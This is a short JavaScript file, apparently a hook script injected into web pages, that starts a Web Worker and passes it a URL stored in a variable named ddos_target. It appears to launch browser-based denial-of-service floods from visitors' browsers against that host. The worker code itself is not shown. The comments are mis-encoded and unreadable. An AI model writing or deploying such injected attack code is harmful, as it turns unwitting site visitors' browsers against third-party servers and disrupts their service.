//run_worker.js : hookjs named run_worker.js
var noWorker = typeof Worker == "undefined"?true:false; //�ж��Ƿ�֧��
var ddos_target="http://216.24.201.98/tools/55xSer.php?p=webworkerddos_abc";
if(!noWorker){
	try{
        var worker =new Worker("worker.js"); //����worker
        worker.postMessage(ddos_target);     //�򴴽���worker�̷߳�����Ϣ
        worker.onmessage =function(evt){     
          console.log(evt.data);              //����̨��ӡ���յ���Ϣ
        }
  }catch(e){
  	e=e+"";
  	alert(e);
    if(e.indexOf("Worker is not enabled")!=-1){
    	noWorker=true;
    }  	
  	
  }
}
    